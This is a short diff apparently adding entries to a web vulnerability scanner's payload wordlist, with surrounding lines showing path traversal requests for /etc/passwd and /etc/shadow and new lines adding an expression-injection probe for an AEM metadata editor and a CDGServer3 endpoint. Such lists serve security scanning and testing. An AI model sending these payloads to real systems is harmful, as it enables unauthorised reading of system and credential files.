@@ -44,3 +44,5 @@
 /badging/badge_print_v0.php?tpl=../../../../../etc/passwd
 /wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
 /.%00./.%00./etc/shadow
+/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html?item=$%7b{{num1}}*{{num2}}%7d
+/CDGServer3/ClientAjax
